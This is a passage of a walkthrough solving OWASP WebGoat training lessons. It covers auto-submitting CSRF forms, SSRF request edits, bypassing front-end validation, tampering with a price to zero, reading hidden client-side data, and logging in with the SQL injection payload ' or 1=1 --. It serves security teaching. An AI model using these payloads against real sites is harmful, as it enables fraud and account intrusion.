![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) This one has a weak anti-CSRF protection, but you do need to overcome (mimic) it

Save the following code in a file **csrf.html** and open it in a web browser.  

```html
<form name="attack" action="http://host:port/WebGoat/csrf/review" method="POST">  
     <input type="hidden" name='reviewText' value='This App Rocks'>  
     <input type="hidden" name='stars' value='5'>  
     <input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'>  
</form>  
<script>document.attack.submit();</script>  
```

7. 
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.
 
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the content-type.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to post the same message with content-type text/plain  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The json can be put into a hidden field inside

Save the following code in a file **csrf.html** and open it in a web browser.  

```html
<form name="attack" enctype="text/plain" action="http://host:port/WebGoat/csrf/feedback/message" method="POST">  
     <input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>  
</form>  
<script>document.attack.submit();</script>
```

8.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) First create a new account with csrf-username  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Create a form which will log you in as this user (hint 1) and upload it to WebWolf  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Visit this assignment again

Follow the instructions.

##### Server-Side Request Forgeries

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You should use an HTTP proxy to intercept the request and change the URL.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If Tom is images/tom.png, Jerry would be images/jerry.png.

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On **WebGoat** click on **Steal the Cheese**.
*   Locate the query to `task1` in the _Network_ tab and click on _Edit and Resend_.
*   Modify the body of the request with `url=images/jerry.png` and send it again.

![SSRF 2](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/ssrf-2.png)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You need to put the protocol, "http://" in front of ifconfig.pro.

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On **WebGoat** click on **Steal the Cheese**.
*   Locate the query to `task2` in the _Network_ tab and click on _Edit and Resend_.
*   Modify the body of the request with `url=http://ifconfig.pro` and send it again.

![SSRF 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/ssrf-3.png)

#### **Client side:**

##### Bypass front-end restrictions

2.
*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On **WebGoat** click on **submit** without editing the parameters.
*   Locate the query to `FieldRestrictions` in the _Network_ tab and click on _Edit and Resend_.
*   Modify the body of the request with `select=option3&radio=option3&checkbox=a&shortInput=123456` and send it again.

![BFER 1](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/bfer-1.png)

3.
*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On **WebGoat** click on **submit** without editing the parameters.
*   Locate the query to `frontendValidation` in the _Network_ tab and click on _Edit and Resend_.
*   Modify the body of the request with `field1=abcz&field2=123z&field3=abc+123+ABC'z&field4=sevenz&field5=01101z&field6=90210-1111z&field7=301-604-4882z&error=0` and send it again.

![BPFER 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/bpfer-3.png)

##### HTML tampering

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to change the number of items and see what is happening  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Is the price part of the HTML request?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Intercept the request and manipulate the price before submitting it.

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On **WebGoat** click on **Chekout** without editing the parameters.
*   Locate the query to `task` in the _Network_ tab and click on _Edit and Resend_.
*   Modify the body of the request with `QTY=2&Total=0` and send it again.

![HTML Tampering](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/html-tampering-2.png)

##### Client side filtering

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The information displayed when an employee is chosen from the drop down menu is stored on the client side.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use Firebug to find where the information is stored on the client side.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Examine the hidden table to see if there is anyone listed who is not in the drop down menu.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look in the last row of the hidden table.

*   Right-click on the **Select user** scrolling element, and click on _Inspect Element_
*   Just below in the HTML, there is a hidden table, in which information about Neville Bartholomew is present.
*   Its salary is 450000.

![Client Side Filtering 2](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/client-side-filtering-2.png)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look through the web page inspect the sources etc  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to see the flow of request from the page to the backen  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) client.side.filtering.free.hint3

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On **WebGoat** click on the **CHECKOUT CODE** case then click on **Chekout** without editing the parameters.
*   Locate the query to `coupons` in the _Network_ tab and click on _Response_.
*   Notice the `get_it_for_free` code to get a discount of 100%.

#### **Challenges:**

##### Admin lost password

*   Download the image http://host:port/WebGoat/images/webgoat2.png.
*   Open it in a text editor.
*   Look up for the string **admin** to find the password **!!webgoat\_admin\_1234!!**.

##### Without password

*   **Username**: `Larry`
*   **Password**: `' or 1=1 --`

##### Creating a new account

This challenge is exactly the same as **(A1) Injection** - SQL Injection (advanced) 5.

##### Admin password reset

##### Without account